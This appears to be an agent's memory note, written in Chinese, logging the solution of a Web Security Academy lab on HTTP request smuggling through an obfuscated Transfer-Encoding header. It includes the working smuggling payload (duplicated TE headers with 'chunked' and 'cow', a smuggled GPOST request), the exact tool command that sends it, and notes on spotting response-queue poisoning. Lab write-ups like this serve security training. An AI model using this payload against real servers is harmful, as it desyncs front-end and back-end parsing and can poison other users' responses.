---
metadata:
  node_type: memory
name: "Lab Obfuscating TE Header arm A"
description: "Obfuscated-TE smuggling lab solved with one conn_reuse CL:4 + duplicated TE frame chunked/cow"
last_updated: 2026-10-10T22:20:39+08:00
created: 2026-10-10T22:20:39+08:00
---

### 2026 求解实录 - lab-obfuscating-te-header arm A

实例: https://0a7d007d03dfec5782ba6fe000ae0039.web-security-academy.net/  range_launch launch-url,jar /tmp/cj1.json,reused:false
题面: 前端拒非 GET/POST;需让后端把下一个请求看成 GPOST。

命中载荷(一条连接两个 piece,conn_reuse):
```
POST / HTTP/1.1
Host: <instance>
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```
落地命令:
conn_reuse <url> --te-cl 'GPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1' --te-line 'Transfer-Encoding: chunked\r\nTransfer-encoding: cow' --send-str 'GET /post?postId=1 HTTP/1.1\r\nHost: H\r\n\r\n' --read-ms 6000
--te-cl 自动补 0+CRLF 终结块,并令 Content-Length = hex+2 = 4;两个 TE 头的异体重名即"混淆"面。

判读: 首轮 载荷 + GET / 只回 1 个响应;随后 banner_verdict 连续 403 - 那是后端连接池里遗留的 GPOST 应答被错配给无关 GET,即响应队列投毒的证据面。次轮换 /post?postId=1 探针,回体首部带 academyLabBanner is-solved。
独立复验: http_session get /post?postId=3 -> is-solved + "Congratulations, you solved the lab!"。

教训: banner_verdict 在同源连接池被投毒时会误报 403/solved:false,换路径或换件复验再定论。

